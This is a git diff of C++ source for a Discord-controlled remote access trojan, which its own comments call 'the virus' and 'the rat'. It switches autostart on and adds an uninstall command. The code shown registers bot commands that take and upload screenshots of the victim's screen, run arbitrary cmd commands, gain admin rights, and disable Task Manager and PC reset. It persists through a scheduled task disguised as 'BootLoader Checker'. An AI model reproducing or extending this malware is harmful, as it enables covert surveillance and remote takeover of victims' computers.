@@ -23,9 +23,9 @@ typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical)(BOOLEAN NewValue, BOOLEAN* Old
 
 
 //shit to change
-const long long int guildId = 12376483628647; // serverid
-const std::string BOT_TOKEN = "Discord-token"; // thank you github for reminding me to not add the new one heree
-const bool autostart = false;
+const long long int guildId = 534534534534; // serverid
+const std::string BOT_TOKEN = "discord-token";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
+const bool autostart = true;
 
 // creates channel at startup and defines functions
 void Screenshot(const std::string& path);
@@ -34,8 +34,6 @@ void Startup();
 void getAdmin(HANDLE &hMutex);
 long long int Channelid_CreateChannel;
 void CreateChannel(dpp::cluster& bot, long long int &channellocationid);
-
-
 
 using namespace dpp;
 
@@ -83,8 +81,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         std::cout << "skipping adding to startup \n";
     }
 
-
-    CreateChannel(bot, Channelid_CreateChannel); // self explanitory lol
+    // calls create channel
+    CreateChannel(bot, Channelid_CreateChannel);
 
     // takes screenshot
     bot.on_slashcommand([](const dpp::slashcommand_t& event) {
@@ -181,6 +179,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 }
                 Gdiplus::GdiplusShutdown(gdiplusToken);
             }
+
             dpp::message msg(event.command.channel_id, "Image sent");
             msg.add_file("screenshot.png", dpp::utility::read_file(screenshot_string));
             event.reply(msg);
@@ -419,6 +418,35 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         });
 
+    // uninstall BTW the virus is still on the system somewhere its just removed from startup and dead so it wont bounce back unless you run it
+    bot.on_slashcommand([isAdmin, &hMutex](const dpp::slashcommand_t& event) {
+        if (event.command.get_command_name() == "uninstall" && (event.command.channel_id == Channelid_CreateChannel)) {
+            if (isAdmin) {
+                wchar_t buffer[MAX_PATH];
+                GetModuleFileName(NULL, buffer, MAX_PATH);
+                std::wstring executablePath = std::wstring(buffer);
+                CoInitializeEx(NULL, COINIT_MULTITHREADED);
+                ITaskService* pService = NULL;
+                CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
+                pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+                ITaskFolder* pRootFolder = NULL;
+                pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
+                pRootFolder->DeleteTask(_bstr_t(L"BootLoader Checker"), 0);
+
+                ReleaseMutex(hMutex);
+                CloseHandle(hMutex);
+                exit(0);
+            }
+            else if (!isAdmin)
+            {
+                event.reply("you are not admin you need admin to run this command run /getadmin");
+            }
+        }
+        else {
+            std::cout << "not for me\n";
+        }
+        });
+
     // send all commands and stuff
     bot.on_ready([&bot, &isAdmin](const dpp::ready_t& event) {
         if (dpp::run_once<struct register_bot_commands>()) {
@@ -434,6 +462,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             bot.global_command_create(dpp::slashcommand("enabletaskmanager", "enables task manager must have admin", bot.me.id));
             bot.global_command_create(dpp::slashcommand("disablereset", "Disables ability to reset pc without a usb", bot.me.id));
             bot.global_command_create(dpp::slashcommand("enablereset", "Disables ability to reset pc without a usb", bot.me.id));
+            bot.global_command_create(dpp::slashcommand("uninstall", "Uninstalls the rat (deosnt delete just removes from startup and kill)", bot.me.id));
 
             // stuff to create run command so you can input data type shit
             dpp::slashcommand runCommandslash("run", "Run a command in cmd", bot.me.id);
